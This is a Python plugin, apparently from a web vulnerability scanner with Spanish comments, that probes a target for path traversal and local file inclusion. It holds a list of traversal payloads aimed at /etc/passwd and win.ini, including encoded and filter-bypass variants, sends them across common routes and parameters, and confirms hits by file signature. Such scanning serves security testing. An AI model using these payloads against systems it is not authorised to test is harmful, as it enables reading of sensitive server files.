#!/usr/bin/env python3
"""Plugin Traversal: Path Traversal / Local File Inclusion de rutas (../).
Confirma por firma real del archivo (root:x:0:0: en /etc/passwd, etc.).
"""
from engine import confirm_lfi

TRV_ROUTES = ["", "/download", "/file", "/view", "/read", "/img", "/doc"]
TRV_PARAMS = ["file", "path", "name", "img", "download", "ufile", "document"]
TRV_PAYLOADS = [
    "../../../../../../etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]


def run(ctx):
    target = ctx.target
    hits = []
    for rt in TRV_ROUTES:
        base_url = target.rstrip("/") + rt
        for param in TRV_PARAMS:
            if ctx.ctrl("traversal") in ("stop", "skip"):
                break
            for p in TRV_PAYLOADS:
                if ctx.ctrl("traversal") in ("stop", "skip"):
                    break
                rr = ctx.req("GET", base_url, {param: p})
                if rr.get("code") == 200:
                    sig = confirm_lfi(rr.get("body", ""), p)
                    if sig:
                        hits.append(f"{rt or '/'}{param}={p}")
                        ctx.emit({"type": "finding", "severity": "high", "module": "traversal",
                                  "detail": f"Path Traversal en '{base_url}' param '{param}' con: {p} (firma: {sig})",
                                  "evidence": {"url": base_url, "param": param, "payload": p}})
                        break
            if hits:
                break
        if hits:
            break
    ctx.emit({"type": "module", "name": "traversal", "status": "done",
              "msg": f"Traversal: {len(hits)} confirmada(s)", "findings": hits})
